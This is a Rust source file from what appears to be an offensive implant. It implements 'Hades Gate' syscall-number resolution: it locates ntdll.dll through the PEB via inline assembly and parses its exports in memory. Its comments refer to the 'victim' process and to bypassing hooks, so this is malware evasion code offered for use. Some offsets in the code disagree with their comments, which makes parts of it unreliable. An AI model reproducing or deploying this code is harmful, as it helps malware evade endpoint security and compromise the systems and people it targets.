// Hades Gate: dynamic syscall resolution from victim's ntdll.dll at runtime.
// Unlike Hell's Gate (reads from disk), Hades Gate resolves SSNs from the
// actual in-memory ntdll.dll of the running process. This:
//   1. Works even if ntdll.dll on disk is different from loaded version
//   2. Adapts to the victim's specific Windows build/patch level
//   3. No hardcoded syscall numbers — all resolved dynamically.
//
// Combined with Hell's Gate (already in syscalls.rs), this gives us
// the most robust syscall resolution available.

#[cfg(target_os = "windows")]
pub mod windows {
    use std::mem;

    /// Resolve a syscall SSN from the LOADED ntdll.dll in this process.
    /// Walks the PE header in memory (not from disk).
    pub fn hades_resolve_ssn(function_name: &str) -> Option<u32> {
        let ntdll_base = get_loaded_ntdll_base()?;
        let exports = parse_loaded_pe_exports(ntdll_base)?;

        let (func_rva, _) = exports.iter()
            .find(|(name, _)| name.eq_ignore_ascii_case(function_name))?;

        let func_addr = ntdll_base + *func_rva as usize;
        let stub_bytes = unsafe { std::slice::from_raw_parts(func_addr as *const u8, 24) };

        // Hades Gate signature: check for syscall stub pattern
        // mov r10, rcx; mov eax, [SSN]; test byte [0x7FFE0308], 1; jne ...
        // The SSN is at offset 4 (little-endian u32)
        if stub_bytes[0] == 0x4C && stub_bytes[1] == 0x8B && stub_bytes[2] == 0xD1 {
            let ssn = u32::from_le_bytes([stub_bytes[4], stub_bytes[5], stub_bytes[6], stub_bytes[7]]);
            return Some(ssn);
        }

        // Alternative: newer Windows uses different stub format
        // Check for direct syscall pattern after hook bypass
        for i in 0..stub_bytes.len().saturating_sub(5) {
            if stub_bytes[i] == 0xB8 && i + 4 < stub_bytes.len() {
                // mov eax, XXXX found
                let ssn = u32::from_le_bytes([
                    stub_bytes[i+1], stub_bytes[i+2], stub_bytes[i+3], stub_bytes[i+4]
                ]);
                if ssn < 0x1000 { // syscall numbers are < 4096
                    return Some(ssn);
                }
            }
        }

        None
    }

    /// Get the base address of ntdll.dll loaded in the current process.
    fn get_loaded_ntdll_base() -> Option<usize> {
        // Use PEB to find loaded modules
        // In Rust without winapi, we use inline asm to read from gs:[0x60]
        let peb: usize;
        unsafe {
            std::arch::asm!(
                "mov {}, gs:[0x60]",
                out(reg) peb,
                options(nostack, nomem),
            );
        }

        // PEB->Ldr->InMemoryOrderModuleList
        let ldr = unsafe { *(peb as *const usize).add(3) }; // PEB_LDR_DATA offset 0x18
        let in_load_order = unsafe { (ldr as *const usize).add(2) }; // InMemoryOrderModuleList

        // Walk the linked list
        let mut entry = unsafe { *in_load_order };
        loop {
            if entry == 0 || entry == in_load_order as usize { break; }
            let dll_base = unsafe { *(entry as *const usize).add(5) }; // LDR_DATA_TABLE_ENTRY.DllBase
            let dll_name_offset = unsafe { *(entry as *const usize).add(10) }; // BaseDllName.Buffer
            let dll_name_len = unsafe { *((entry as *const usize).add(9) as *const u16) }; // BaseDllName.Length

            if dll_name_offset != 0 && dll_name_len > 0 {
                let name = String::from_utf16_lossy(
                    unsafe { std::slice::from_raw_parts(dll_name_offset as *const u16, dll_name_len as usize / 2) }
                );
                if name.to_lowercase().contains("ntdll") {
                    return Some(dll_base);
                }
            }

            entry = unsafe { *(entry as *const usize) }; // Flink
        }

        None
    }

    /// Parse PE exports from a loaded module base.
    fn parse_loaded_pe_exports(base: usize) -> Option<Vec<(String, u32)>> {
        let dos_header = base;
        let pe_offset = unsafe { *(dos_header as *const u32).add(15) } as usize; // e_lfanew at offset 0x3C

        let export_rva = unsafe {
            *((base + pe_offset + 0x88) as *const u32) // IMAGE_DATA_DIRECTORY[0] = Export
        };

        if export_rva == 0 { return None; }

        let export_dir = base + export_rva as usize;
        let num_names = unsafe { *(export_dir as *const u32).add(6) } as usize;
        let funcs_rva = unsafe { *(export_dir as *const u32).add(7) } as usize;
        let names_rva = unsafe { *(export_dir as *const u32).add(8) } as usize;
        let ordinals_rva = unsafe { *(export_dir as *const u32).add(9) } as usize;

        let mut exports = Vec::new();
        for i in 0..num_names {
            let name_rva = unsafe { *((base + names_rva + i * 4) as *const u32) };
            let name = read_c_str((base + name_rva as usize) as *const u8);
            let ordinal = unsafe { *((base + ordinals_rva + i * 2) as *const u16) } as usize;
            let func_rva = unsafe { *((base + funcs_rva + ordinal * 4) as *const u32) };
            exports.push((name, func_rva));
        }

        Some(exports)
    }

    fn read_c_str(ptr: *const u8) -> String {
        let mut s = Vec::new();
        for i in 0..256 {
            let b = unsafe { *ptr.add(i) };
            if b == 0 { break; }
            s.push(b);
        }
        String::from_utf8_lossy(&s).to_string()
    }
}

#[cfg(target_os = "windows")]
pub use windows::*;
